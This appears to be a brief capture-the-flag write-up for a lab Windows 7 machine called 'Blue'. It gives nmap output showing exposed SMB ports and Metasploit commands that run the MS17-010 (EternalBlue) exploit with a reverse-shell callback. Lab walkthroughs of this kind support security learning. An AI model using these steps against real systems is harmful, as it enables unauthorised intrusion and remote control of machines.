#	BLUE (10.10.10.40 -windows box)
##	Writeup by Hexachroma

###	This room features eternalblue or MS17-010

1. nmap -sC -sV -oN nmap/init blue.htb -v
```
135/tcp   open  msrpc        Microsoft Windows RPC
139/tcp   open  netbios-ssn  Microsoft Windows netbios-ssn
445/tcp   open  microsoft-ds Windows 7 Professional 7601 Service Pack 1 microsoft-ds (workgroup: WORKGROUP)
49152/tcp open  msrpc        Microsoft Windows RPC
49153/tcp open  msrpc        Microsoft Windows RPC
49154/tcp open  msrpc        Microsoft Windows RPC
49155/tcp open  msrpc        Microsoft Windows RPC
49156/tcp open  msrpc        Microsoft Windows RPC
49157/tcp open  msrpc        Microsoft Windows RPC
Service Info: Host: HARIS-PC; OS: Windows; CPE: cpe:/o:microsoft:windows
```
> has SMB installed (green flag for eternalblue)

2. Exploiting EternalBlue with metasploit
>	`msfconsole -q`
>	enter `use windows/smb/ms17_010_psexec`
> 	enter `set RHOST 10.10.10.40`
>	enter `set LHOST tun0`
>	enter `set LPORT xxxx`